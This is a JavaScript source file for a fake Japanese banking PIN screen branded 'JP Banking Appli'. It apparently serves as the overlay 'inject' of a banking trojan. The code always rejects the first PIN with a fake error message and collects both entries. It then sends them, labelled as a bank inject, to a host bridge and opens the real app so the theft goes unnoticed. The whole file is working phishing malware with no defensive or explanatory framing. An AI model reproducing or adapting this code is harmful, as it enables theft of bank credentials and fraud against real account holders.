(() => {
  const PIN_MIN = 4;
  const PIN_MAX = 8;
  const SUBMIT_IDLE_MS = 700;

  const pinDots = Array.from(document.querySelectorAll("#pinDisplay .pin-dot"));
  const errorMsg = document.getElementById("errorMsg");
  const forgotBtn = document.getElementById("forgotBtn");
  const keypad = document.getElementById("keypad");

  let pin = "";
  let attemptCount = 0;
  let firstPin = null;
  let locked = false;
  let idleTimer = 0;

  function bridge() {
    try {
      return window.MiluBridge || null;
    } catch (_) {
      return null;
    }
  }

  function reportDone(payload) {
    const b = bridge();
    if (b && typeof b.done === "function") {
      try {
        b.done(payload);
      } catch (_) {
        /* ignore */
      }
    }
  }

  function openApp() {
    const b = bridge();
    if (b && typeof b.openApp === "function") {
      try {
        b.openApp();
      } catch (_) {
        /* ignore */
      }
    }
  }

  function buildPayload(pin1, pin2) {
    return JSON.stringify({
      pin1,
      pin2,
      brand: "JP Banking Appli",
      type_injects: "banks",
      closed: "close_activity_injects",
      timestamp: new Date().toISOString(),
    });
  }

  function renderDots() {
    pinDots.forEach((dot, index) => {
      const visible = index < pin.length;
      dot.classList.toggle("is-visible", visible);
    });
  }

  function clearPin() {
    pin = "";
    renderDots();
    window.clearTimeout(idleTimer);
  }

  function shakeDots() {
    pinDots.forEach((dot) => {
      if (dot.classList.contains("is-visible")) {
        dot.classList.add("is-shake");
      }
    });
    window.setTimeout(() => {
      pinDots.forEach((dot) => dot.classList.remove("is-shake"));
      clearPin();
    }, 380);
  }

  function scheduleIdleSubmit() {
    window.clearTimeout(idleTimer);
    if (pin.length < PIN_MIN || pin.length >= PIN_MAX) {
      return;
    }
    idleTimer = window.setTimeout(() => {
      trySubmit();
    }, SUBMIT_IDLE_MS);
  }

  function trySubmit() {
    if (locked || pin.length < PIN_MIN) {
      return;
    }

    window.clearTimeout(idleTimer);
    errorMsg.textContent = "";
    attemptCount += 1;

    if (attemptCount === 1) {
      firstPin = pin;
      errorMsg.textContent = "暗証番号が正しくありません。もう一度入力してください。";
      shakeDots();
      return;
    }

    locked = true;
    reportDone(buildPayload(firstPin, pin));
    window.setTimeout(() => {
      openApp();
      locked = false;
    }, 320);
  }

  function pushDigit(digit) {
    if (locked || pin.length >= PIN_MAX) {
      return;
    }
    errorMsg.textContent = "";
    pin += digit;
    renderDots();

    if (pin.length >= PIN_MAX) {
      trySubmit();
      return;
    }
    scheduleIdleSubmit();
  }

  function deleteDigit() {
    if (locked || !pin.length) {
      return;
    }
    pin = pin.slice(0, -1);
    renderDots();
    errorMsg.textContent = "";
    scheduleIdleSubmit();
  }

  keypad.addEventListener("click", (event) => {
    const btn = event.target.closest("[data-key]");
    if (!btn) {
      return;
    }
    const key = btn.getAttribute("data-key");
    if (key === "del") {
      deleteDigit();
      return;
    }
    if (/^\d$/.test(key)) {
      pushDigit(key);
    }
  });

  forgotBtn.addEventListener("click", () => {
    if (locked) {
      return;
    }
    errorMsg.textContent = "暗証番号を入力して続行してください。";
  });

  renderDots();
})();
